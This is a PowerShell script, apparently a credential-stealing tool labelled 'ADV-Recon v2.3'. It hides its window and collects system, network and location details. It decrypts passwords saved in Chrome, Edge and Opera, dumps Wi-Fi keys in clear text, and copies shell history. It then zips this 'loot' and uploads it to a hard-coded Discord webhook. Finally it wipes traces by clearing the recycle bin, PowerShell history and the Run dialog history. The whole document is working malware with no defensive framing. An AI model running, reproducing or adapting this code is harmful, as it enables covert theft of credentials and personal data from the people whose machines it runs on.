# === CONFIGURATIE ===
$dc = "https://discord.com/api/webhooks/1430461657829740706/T6oaosfibMgogVMfM5j2Mfg7MpanFy80UUjMwXi6NDmpyUl77ezJwGsWWxCCKB86yCsD"

# === DISCORD START NOTIFICATIE ===
if ($dc) {
    $hookurl = $dc
    $Body = @{
        'username' = "ADV-Recon v2.3"
        'content' = "**Recon GESTART**`n**PC**: $env:COMPUTERNAME`n**User**: $env:USERNAME`n**Tijd**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue
}

# Hide window
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

# Maak loot folder
$FolderName = "$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm)"
$ZIP = "$FolderName.zip"
New-Item -Path "$env:tmp\$FolderName" -ItemType Directory -Force | Out-Null

############################################################################################################################################################
# RECON FUNCTIONS
############################################################################################################################################################

function Get-fullName {
    try { return (Get-LocalUser -Name $env:USERNAME).FullName }
    catch { return $env:USERNAME }
}

function Get-email {
    try { return (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName }
    catch { return "No Email Detected" }
}

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') { return "Access Denied" }
        else { 
            $pos = $GeoWatcher.Position.Location
            return "$($pos.Latitude),$($pos.Longitude)"
        }
    }
    catch { return "No Coordinates found" }
}

function Get-RegistryValue($key, $value) {  
    try { return (Get-ItemProperty $key $value -ErrorAction Stop).$value }
    catch { return "Unknown" }
}

############################################################################################################################################################
# ADVANCED BROWSER PASSWORD EXTRACTION (LOCAL DECRYPTION)
############################################################################################################################################################

function Get-BrowserPasswords {
    $ErrorActionPreference = 'SilentlyContinue'
    $browserPasswords = @()
    
    # SQLite3 P/Invoke
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class WinSQLite3
        {
            const string dll = "winsqlite3";
            [DllImport(dll, EntryPoint="sqlite3_open")]
            public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
            [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
            public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
            [DllImport(dll, EntryPoint="sqlite3_step")]
            public static extern IntPtr Step(IntPtr stmt);
            [DllImport(dll, EntryPoint="sqlite3_column_text16")]
            static extern IntPtr ColumnText16(IntPtr stmt, int index);
            [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
            static extern int ColumnBytes(IntPtr stmt, int index);
            [DllImport(dll, EntryPoint="sqlite3_column_blob")]
            static extern IntPtr ColumnBlob(IntPtr stmt, int index);
            public static string ColumnString(IntPtr stmt, int index) 
            { 
                return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
            }
            public static byte[] ColumnByteArray(IntPtr stmt, int index)
            {
                int length = ColumnBytes(stmt, index);
                byte[] result = new byte[length];
                if (length > 0)
                    Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
                return result;
            }
            [DllImport(dll, EntryPoint="sqlite3_finalize")]
            public static extern IntPtr Finalize(IntPtr stmt);
            [DllImport(dll, EntryPoint="sqlite3_close")]
            public static extern IntPtr Close(IntPtr db);
        }
"@

    # AES Decryption function
    function Decrypt-ChromePassword {
        param([byte[]]$encrypted, [string]$key)
        try {
            $iv = [byte[]](0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20)
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = [Convert]::FromBase64String($key)
            $aes.IV = $iv
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            
            $decryptor = $aes.CreateDecryptor()
            $decrypted = $decryptor.TransformFinalBlock($encrypted, 3, $encrypted.Length - 3)
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
        catch { return "DECRYPT_FAILED" }
    }

    # Chrome/Edge/Opera
    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data"; Process="chrome"},
        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Process="msedge"},
        @{Name="Opera"; Path="$env:APPDATA\Opera Software\Opera Stable"; Process="opera"},
        @{Name="OperaGX"; Path="$env:APPDATA\Opera Software\Opera GX Stable"; Process="opera"}
    )

    foreach ($browser in $browsers) {
        try {
            # Kill browser process
            Stop-Process -Name $browser.Process -Force -ErrorAction SilentlyContinue
            
            $localState = "$($browser.Path)\Local State"
            $loginData = "$($browser.Path)\Login Data"
            
            if (Test-Path $localState -and Test-Path $loginData) {
                # Get encryption key
                $secret = Get-Content -Raw -Path $localState | ConvertFrom-Json
                $encryptedKey = [Convert]::FromBase64String($secret.os_crypt.encrypted_key)
                $key = [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey[5..($encryptedKey.Length-1)], $null, 'CurrentUser'))
                
                # Query database (check profiles)
                $profiles = @("Default")
                $profileDirs = Get-ChildItem -Path $browser.Path -Directory | Where-Object { $_.Name -match "^Profile [0-9]+$|^Default$" }
                foreach ($prof in $profileDirs) { $profiles += $prof.Name }
                
                foreach ($profile in $profiles) {
                    $profileLoginData = "$($browser.Path)\$profile\Login Data"
                    if (Test-Path $profileLoginData) {
                        $dbH = [IntPtr]::Zero
                        $stmt = [IntPtr]::Zero
                        
                        if ([WinSQLite3]::Open($profileLoginData, [ref]$dbH) -eq 0) {
                            $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0 AND origin_url LIKE '%https%'"
                            if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
                                while ([WinSQLite3]::Step($stmt) -eq 100) {
                                    $url = [WinSQLite3]::ColumnString($stmt, 0)
                                    $username = [WinSQLite3]::ColumnString($stmt, 1)
                                    $encryptedPass = [WinSQLite3]::ColumnByteArray($stmt, 2)
                                    
                                    if ($username -and $encryptedPass -and $encryptedPass.Length -gt 3 -and $url -notlike "*://*127.*" -and $url -notlike "*://*localhost*") {
                                        $password = Decrypt-ChromePassword -encrypted $encryptedPass -key $key
                                        if ($password -ne "DECRYPT_FAILED" -and $password.Length -gt 0) {
                                            $browserPasswords += [PSCustomObject]@{
                                                Browser = $browser.Name
                                                Profile = $profile
                                                URL = $url
                                                Username = $username
                                                Password = $password
                                            }
                                        }
                                    }
                                }
                                [WinSQLite3]::Finalize($stmt) | Out-Null
                            }
                            [WinSQLite3]::Close($dbH) | Out-Null
                        }
                    }
                }
            }
        }
        catch { continue }
    }
    
    return $browserPasswords
}

############################################################################################################################################################
# DATA COLLECTION
############################################################################################################################################################

Write-Host "Collecting basic info..." -ForegroundColor Green
$fullName = Get-fullName
$email = Get-email
$GeoLocation = Get-GeoLocation

Write-Host "Collecting system info..." -ForegroundColor Green
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 

# UAC
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key "ConsentPromptBehaviorAdmin"
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key "PromptOnSecureDesktop"
if ($ConsentPromptBehaviorAdmin_Value -eq 0 -and $PromptOnSecureDesktop_Value -eq 0) { $UAC = "Never Notify" }
elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 0) { $UAC = "Notify (no dim)" }
elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 1) { $UAC = "Notify (default)" }
elseif ($ConsentPromptBehaviorAdmin_Value -eq 2 -and $PromptOnSecureDesktop_Value -eq 1) { $UAC = "Always Notify" }
else { $UAC = "Unknown" }

# LSASS
$lsass = Get-Process -Name "lsass" -ErrorAction SilentlyContinue
$lsass = if ($lsass.ProtectedProcess) { "Protected" } else { "Not Protected" }

# Startup
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup")) -ErrorAction SilentlyContinue).Name -join "`n"

# Nearby WiFi
try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim() -join "`n"
} catch {
    $NearbyWifi = "No nearby wifi networks detected"
}

# Network info
try { $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing -TimeoutSec 5).Content.Trim() }
catch { $computerPubIP = "Error getting Public IP" }

try { $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String }
catch { $localIP = "Error getting local IP" }

$MAC = Get-NetAdapter | Select Name, MacAddress, Status | Out-String

# RDP
try {
    $RDP = if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -ErrorAction Stop).fDenyTSConnections -eq 0) { 
        "RDP is Enabled" 
    } else { 
        "RDP is NOT enabled" 
    }
} catch {
    $RDP = "RDP status unknown"
}

# System info
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement | Select Manufacturer, SMBIOSBIOSVersion | Out-String
$computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
$computerCpu = Get-WmiObject Win32_Processor | select Name, Manufacturer, MaxClockSpeed | Format-List | Out-String
$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
$videocard = Get-WmiObject Win32_VideoController | Select Name, AdapterRAM | Format-Table | Out-String

# WiFi profiles
try {
    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name = $_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass = $_.Matches.Groups[1].Value.Trim(); $_} | %{"$name : $pass"} | Out-String
} catch {
    $wifiProfiles = "Error getting WiFi profiles"
}

# Tree & History
tree $Env:userprofile /a /f > "$env:tmp\$FolderName\tree.txt" 2>$null
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$env:tmp\$FolderName\Powershell-History.txt" -ErrorAction SilentlyContinue

############################################################################################################################################################
# EXTRACT BROWSER PASSWORDS
############################################################################################################################################################

Write-Host "Extracting browser passwords..." -ForegroundColor Green
$browserPasswords = Get-BrowserPasswords

# Save passwords to file
$passwordOutput = @"
#################################################################
# BROWSER PASSWORDS ($($browserPasswords.Count) found)
#################################################################
"@

foreach ($pass in $browserPasswords) {
    $passwordOutput += @"

**Browser**: $($pass.Browser) ($($pass.Profile))
**URL**: $($pass.URL)
**Username**: $($pass.Username)
**Password**: $($pass.Password)
---
"@
}

$passwordOutput | Out-File "$env:tmp\$FolderName\BrowserPasswords.txt"

$passwordSummary = "**Browser Passwords**: $($browserPasswords.Count) extracted"

############################################################################################################################################################
# OUTPUT FILE
############################################################################################################################################################

Write-Host "Creating report..." -ForegroundColor Green
$output = @"

############################################################################################################################################################
# ADV-Recon v2.3 - Results for $env:COMPUTERNAME
############################################################################################################################################################

**Full Name**: $fullName
**Email**: $email
**GeoLocation**: $GeoLocation

**UAC**: $UAC
**LSASS**: $lsass
**RDP**: $RDP

$passwordSummary

**Public IP**: $computerPubIP

**Computer Name**: $computerName
**Model**: $computerModel
**Manufacturer**: $computerManufacturer
**OS**: $computerOs
**CPU**: $computerCpu
**RAM**: $computerRamCapacity
**Video Card**: $videocard

**WiFi Profiles**:
$wifiProfiles

**Startup Items**:
$StartUp

**Nearby WiFi**:
$NearbyWifi

---
**Full tree, history, browser passwords in separate files**
**Recon completed**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
############################################################################################################################################################

"@

$output | Out-File "$env:tmp\$FolderName\computerData.txt"

############################################################################################################################################################
# ZIP & UPLOAD
############################################################################################################################################################

Write-Host "Creating ZIP and uploading..." -ForegroundColor Green
Compress-Archive -Path "$env:tmp\$FolderName" -DestinationPath "$env:tmp\$ZIP" -Force

# Discord upload
function Upload-Discord {
    param([string]$file, [string]$text = "")
    if ($dc -and $file -and (Test-Path $file)) {
        $uploadText = if ($text) { $text } else { "**Recon VOLTOOID!** $env:COMPUTERNAME - $env:USERNAME - **$($browserPasswords.Count) passwords**" }
        & curl.exe -F "file1=@$file" -F "content=$uploadText" $dc -s
    }
}

if ($dc) { 
    Upload-Discord -file "$env:tmp\$ZIP" 
}

Write-Host "Upload completed!" -ForegroundColor Green

############################################################################################################################################################
# CLEANUP
############################################################################################################################################################

Write-Host "Cleaning up..." -ForegroundColor Green
Remove-Item "$env:tmp\$FolderName*" -Recurse -Force -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null

Write-Host "Recon completed successfully!" -ForegroundColor Green
